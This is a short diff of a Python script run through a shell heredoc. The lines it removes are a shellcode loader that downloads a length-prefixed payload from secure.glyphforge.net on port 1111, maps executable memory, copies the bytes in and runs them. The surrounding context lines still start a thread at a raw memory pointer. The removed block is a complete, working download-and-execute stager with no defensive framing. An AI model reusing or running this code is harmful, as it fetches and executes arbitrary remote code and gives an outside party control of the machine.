@@ -43,38 +43,4 @@ tid = ctypes.c_ulong(0)
 pthread.pthread_create(ctypes.byref(tid), None, ctypes.c_void_p(ptr), None)
 print(f"[+] Thread spawned: {tid.value}")
 pthread.pthread_join(tid, None)
-EOFpython3 - <<EOF
-import socket, struct, ctypes
-
-# Connect and download
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.settimeout(10)
-s.connect(("secure.glyphforge.net", 1111))
-size_data = s.recv(4)
-size = struct.unpack('<I', size_data)[0]
-shellcode = b''
-while len(shellcode) < size:
-    chunk = s.recv(size - len(shellcode))
-    if not chunk:
-        break
-    shellcode += chunk
-s.close()
-print(f"[+] Got {len(shellcode)} bytes")
-
-# Execute
-try:
-    lib = ctypes.CDLL(None)
-    lib.mmap.restype = ctypes.c_void_p
-    ptr = lib.mmap(0, len(shellcode), 0x7, 0x22, -1, 0)
-    print(f"[+] mmap ptr: {ptr}")
-    if ptr is None or ptr == 0:
-        print("[-] mmap failed")
-        exit(1)
-    ctypes.memmove(ptr, shellcode, len(shellcode))
-    print("[+] Shellcode copied, executing...")
-    func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
-    func()
-    print("[+] Executed")
-except Exception as e:
-    print(f"[-] Execution error: {e}")
 EOF
